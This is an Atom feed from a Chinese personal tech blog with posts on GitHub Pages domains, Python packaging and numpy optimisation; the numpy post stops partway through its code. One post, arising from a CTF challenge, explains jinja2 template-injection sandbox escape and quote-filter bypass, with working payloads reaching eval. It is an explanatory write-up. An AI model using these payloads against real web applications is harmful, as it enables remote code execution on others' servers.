<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>littlezz's Blog</title><link href="http://littlezz.github.io/" rel="alternate"></link><link href="http://littlezz.github.io/feeds/all.atom.xml" rel="self"></link><id>http://littlezz.github.io/</id><updated>2017-05-02T00:00:00+08:00</updated><entry><title>Github Page 自定义子域名</title><link href="http://littlezz.github.io/github-page-zi-ding-yi-zi-yu-ming.html" rel="alternate"></link><updated>2017-05-02T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2017-05-02:github-page-zi-ding-yi-zi-yu-ming.html</id><summary type="html">&lt;p&gt;目标：设置域名&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;xxx.github.io --&amp;gt; blog.xxx.com
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;首先在 github page 上面的项目里添加一个文件&lt;code&gt;CNAME&lt;/code&gt;, 内容是目标站点&lt;code&gt;blog.xxx.com&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;之后， 在 DNS advance 上面增加一条CNAME记录， 如果要使用&lt;code&gt;blog.xxx.com&lt;/code&gt;那么 &lt;code&gt;host&lt;/code&gt; 的值填 &lt;code&gt;blog&lt;/code&gt;而不是&lt;code&gt;blog.xxx.com&lt;/code&gt;， value 填&lt;code&gt;xxx.github.io&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果你的 github page 是一个不断更新的博客， 必须在渲染时增加 CNAME 记录。  我是用的是 pelican， 设置方法是在&lt;code&gt;pelicanconf.py&lt;/code&gt; 中设置&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;EXTRA_PATH_METADATA&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;static/CNAME&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;CNAME&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;STATIC_PATHS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;images&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
                &lt;span class="s1"&gt;&amp;#39;static&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后就是等待 dns 的刷新了&lt;/p&gt;
&lt;h3 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;小结&lt;/h3&gt;
&lt;p&gt;CNAME 设置是 &lt;code&gt;blog&lt;/code&gt;， 而不&lt;code&gt;blog.xxx.com&lt;/code&gt;, 不然域名会解析到&lt;code&gt;blog.xxx.com.xxx.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;另外， pelican 默认只听是 googleapi 上面的， 虽然据说可能大概好像也许， 在北京有服务器， 但是我这里还是很慢， 于是我把字体的 url 改成了中科大的。  &lt;/p&gt;
&lt;p&gt;方法：&lt;br /&gt;
在主题里的 templates 目录的&lt;code&gt;base.html&lt;/code&gt;中&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;lt;!--&amp;lt;link href=&amp;#39;//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic&amp;#39; rel=&amp;#39;stylesheet&amp;#39; type=&amp;#39;text/css&amp;#39;&amp;gt;--&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;//fonts.proxy.ustclug.org/css?family=Source+Sans+Pro:300,400,700,400italic&amp;#39;&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;stylesheet&amp;#39;&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;text/css&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</summary><category term="小结"></category><category term="小技巧"></category></entry><entry><title>jinja2 模板注入绕过引号任意代码执行</title><link href="http://littlezz.github.io/jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing.html" rel="alternate"></link><updated>2017-05-01T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2017-05-01:jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing.html</id><summary type="html">&lt;h3 id="intro"&gt;&lt;a name="user-content-intro" href="#intro" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;intro&lt;/h3&gt;
&lt;p&gt;不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。&lt;del&gt;（当然最后是用其他的方法&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;后来想了一下绕过引号的方法。&lt;/p&gt;
&lt;p&gt;首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是&lt;code&gt;__buildtins__&lt;/code&gt;, 然后找出 &lt;code&gt;eval&lt;/code&gt;进行任意代码执行， 绕过沙盒的限制&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#! python3&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;jinja2&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Template&lt;/span&gt;
&lt;span class="n"&gt;Template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{{[].__class__}}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;render&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="c1"&gt;#output &amp;quot;&amp;lt;class &amp;#39;list&amp;#39;&amp;gt;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们可以通过这种方法调用自带的函数或者对象， 通过&lt;code&gt;subclasses&lt;/code&gt; 找到更加多的类&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__base__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__subclasses__&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;([]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__base__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__subclasses__&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="c1"&gt;#output type&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后利用其中的 &lt;code&gt;catch_warnings&lt;/code&gt; 访问 globals 定位出 &lt;code&gt;eval&lt;/code&gt;， 然后进行任意代码执行。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#python3 &lt;/span&gt;

&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;146&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__base__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__subclasses__&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="mi"&gt;166&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;Out&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;146&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="n"&gt;warnings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;catch_warnings&lt;/span&gt;

&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;153&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="n"&gt;Template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{{[].__class__.__base__.__subclasses__()[166].__init__.__g&lt;/span&gt;
     &lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;lobals__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__builtins__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1+1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)}}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;).render()&lt;/span&gt;
&lt;span class="n"&gt;Out&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;153&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;绕过引号&lt;/h3&gt;
&lt;p&gt;一般情况下， &lt;code&gt;%&lt;/code&gt;会被过滤， 但是如果引号也被过滤的话怎么构造出 eval 可以执行的字符串呢？&lt;/p&gt;
&lt;p&gt;特别说明的是 &lt;code&gt;chr&lt;/code&gt; 是没有办法在模板中调用的。因为在沙盒中这个函数是不存在的。（&lt;code&gt;chr&lt;/code&gt;？不存在的。）&lt;/p&gt;
&lt;p&gt;我们可以使用数字列表转化成字节流， 之后转化成字符串的方法。&lt;/p&gt;
&lt;p&gt;利用&lt;code&gt;bytes&lt;/code&gt;， 但是 python3和 python2略有不同&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# python3&lt;/span&gt;

&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;156&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="n"&gt;Out&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;156&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1+1&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;157&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
&lt;span class="n"&gt;Out&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;157&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4 id="python3"&gt;&lt;a name="user-content-python3" href="#python3" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;python3&lt;/h4&gt;
&lt;p&gt;利用：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;jinja2&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Template&lt;/span&gt;

&lt;span class="n"&gt;attack_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__import__(&amp;quot;sys&amp;quot;).version&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;attack_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;attack&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;attack_input&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{{&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;[].__class__.__base__.__subclasses__()[166].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]({attack_list}))&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;attack_list&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;attack_list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;}}&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;attack_input&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#output {{[].__class__.__base__.__subclasses__()[166].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]))}}&lt;/span&gt;

&lt;span class="n"&gt;Template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{user_input}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;attack_input&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;render&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="c1"&gt;#output &amp;#39;3.6.1 (default, Mar 23 2017, 16:49:06) \n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)]&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4 id="python2"&gt;&lt;a name="user-content-python2" href="#python2" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;python2&lt;/h4&gt;
&lt;p&gt;python2 的&lt;code&gt;catch_warnings&lt;/code&gt;在&lt;code&gt;[59]&lt;/code&gt;的位置， 另外 python2 的 eval 不接受字节流， 需要特别调用&lt;code&gt;__str__&lt;/code&gt;方法来转化成字符串。其余和 python3相同。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]).__str__())}}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;render&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="c1"&gt;#output u&amp;#39;2.7.10 (default, Feb  6 2017, 23:53:20) \n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;2017-05-01 20:33:47&lt;/p&gt;</summary><category term="python"></category><category term="小结"></category></entry><entry><title>Python打包时添加非代码文件的坑</title><link href="http://littlezz.github.io/pythonda-bao-shi-tian-jia-fei-dai-ma-wen-jian-de-keng.html" rel="alternate"></link><updated>2016-12-12T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-12-12:pythonda-bao-shi-tian-jia-fei-dai-ma-wen-jian-de-keng.html</id><summary type="html">&lt;p&gt;对于 Python 的打包， 通常有两种， 一种是对源文件打包， 一种是安装包， 既在上传 pypi 的时候一般会执行&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python3 setup.py sdist bdist_wheel
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用pip安装的时候一般是安装bdist打包出来的文件。&lt;/p&gt;
&lt;p&gt;关于在打包中加入非程序文件， 有几种方法， 一种是在 MANIFEST.in 中加入， 对于 setup.py 中也提供了&lt;code&gt;package_data&lt;/code&gt;参数， 另外对于 setuptools 还提供了特别的 &lt;code&gt;include_package_data&lt;/code&gt;的参数， 接下来介绍这些参数的意义和怎么用。  &lt;/p&gt;
&lt;h2 id="manifestin"&gt;&lt;a name="user-content-manifestin" href="#manifestin" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;MANIFEST.in&lt;/h2&gt;
&lt;p&gt;MANIFEST.in文件是针对 源文件打包 的， 当需要把非程序文件， 包括README， css或者test文件等加入时， 在MANIFEST.in中指定， 用于生成MANIFEST&lt;/p&gt;
&lt;p&gt;MIANIFEST会暗中自动寻找以下的文件：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有&lt;code&gt;py_modules&lt;/code&gt; 和 &lt;code&gt;packages&lt;/code&gt;中没有明确说明的python文件 &lt;/li&gt;
&lt;li&gt;ext_modules 或 libraries选项中指明的C文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;scripts&lt;/code&gt;指明的文件&lt;/li&gt;
&lt;li&gt;所有看上去像是test文件的， 比如&lt;code&gt;tests/*.py&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;README.txt 或者 README, setup.py, setup.cfg&lt;/li&gt;
&lt;li&gt;&lt;code&gt;package_data&lt;/code&gt;中指明的文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;data_files&lt;/code&gt;中指明的文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="package_data"&gt;&lt;a name="user-content-package_data" href="#package_data" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;package_data&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;package_data&lt;/code&gt;是在setup.py中的参数， 用于控制安装包里面包含的文件。&lt;br /&gt;
应该这样理解， MANIFEST 控制 sdist 包含的内容， package_data控制bdist包含的内容。  &lt;/p&gt;
&lt;p&gt;一般情况是， 对源文件打包里面一般包含README， tests这些， 但是对于安装包这不需要。  所以分开设置。  &lt;/p&gt;
&lt;h2 id="include_package_data"&gt;&lt;a name="user-content-include_package_data" href="#include_package_data" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;include_package_data&lt;/h2&gt;
&lt;p&gt;坑就是指&lt;code&gt;include_package_data&lt;/code&gt;， 这个参数是setuptools特有的， 但是非常容易让人误解然后勿用。 setuptools的文档中是这样写的&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If set to True, this tells setuptools to automatically include any data files it finds inside your package directories that are specified by your MANIFEST.in file. For more information, see the section below on Including Data Files.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;设为 True 时， 打包时setuptools 会自动加入在 MANIFEST.in中指定的文件。&lt;/p&gt;
&lt;p&gt;原本是 MANIFEST 在 setup.py 中的&lt;code&gt;package_data&lt;/code&gt;寻找额外的文件的， 现在变成大家以 MANIFEST.in 为准了。&lt;/p&gt;
&lt;p&gt;这会发生什么事情呢， &lt;br /&gt;
如果你同时用了&lt;code&gt;include_package_data&lt;/code&gt;和&lt;code&gt;package_data&lt;/code&gt;， 那么你的 sdist 就会瞬间爆炸。&lt;br /&gt;
bdist 打包出来的东西会包含&lt;code&gt;package_data&lt;/code&gt;中的内容， 但是源代码打包的时候就会失去在&lt;code&gt;package_data&lt;/code&gt;中指明的文件。  &lt;/p&gt;
&lt;h2 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;总结&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;永远也不要用&lt;code&gt;include_package_data&lt;/code&gt;&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;MANIFEST.in&lt;/code&gt; 用来给源文件打包， 里面包含许多额外的信息， 比如测试文件之类的。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;package_data&lt;/code&gt;用于指定安装时加入的额外的文件， 不需要再MANIFEST.in中重复定义， 源文件打包的时候回自动包含这里面的文件。  &lt;/p&gt;
&lt;p&gt;参考:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3.4/distutils/sourcedist.html#specifying-the-files-to-distribute"&gt;specifying-the-files-to-distribute&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://setuptools.readthedocs.io/en/latest/setuptools.html#including-data-files"&gt;setuptools&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2016年12月12日01:04:25&lt;/p&gt;</summary><category term="python"></category><category term="小结"></category></entry><entry><title>对numpy的一系列实验</title><link href="http://littlezz.github.io/dui-numpyde-yi-xi-lie-shi-yan.html" rel="alternate"></link><updated>2016-12-08T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-12-08:dui-numpyde-yi-xi-lie-shi-yan.html</id><summary type="html">&lt;p&gt;本文主要总结了如何把numpy计算速度优化100倍的过程。  &lt;/p&gt;
&lt;h2 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;简介&lt;/h2&gt;
&lt;p&gt;最近要对图片做二值化， 参照&lt;a href="http://people.scs.carleton.ca/~roth/iit-publications-iti/docs/gerh-50002.pdf"&gt;Adaptive Thresholding Using the Integral Image&lt;/a&gt; 这篇论文， 可是Python的for循环非常的慢，单纯的翻译伪代码实现起来速度要比C慢接近100倍， 论文上的实现对640x480的图片用时大概为15ms， 接下来我们要一步步从最初的慢100倍优化到和C一样快， 以及最后再比它快一点点。&lt;/p&gt;
&lt;h2 id="_2"&gt;&lt;a name="user-content-_2" href="#_2" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;算法&lt;/h2&gt;
&lt;p&gt;首先， 介绍一下 Adaptive Thresholding Using the Integral Image 这篇论文， 论文很简单， 对一个点周围的一片区域取平均值， 如果该点低于平均值的85%， 就设为黑， 否则为白色。 论文主要是用累积和来改进取一片区域平均值的速度。 &lt;br /&gt;
过程为水平方向做一次累积和， 垂直方向做一次累积和， 这样每一个点就表示其左上角的区域的和， 于是要计算一个矩形（a, b, c, d), 其区域上的和就是 d - b -c + a. &lt;br /&gt;
原始的扫描区域的每一个点求和， 时间是O(n * n * boxsize * boxsize)， 现在变成了常数时间。  &lt;/p&gt;
&lt;h2 id="_3"&gt;&lt;a name="user-content-_3" href="#_3" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;直观实现&lt;/h2&gt;
&lt;p&gt;首先我们直接照着原理实现，理论是最快的&lt;br /&gt;
（然而实际是最慢的） &lt;/p&gt;
&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;intuitive_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;
    &lt;span class="n"&gt;integral_map&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros_like&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dtype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
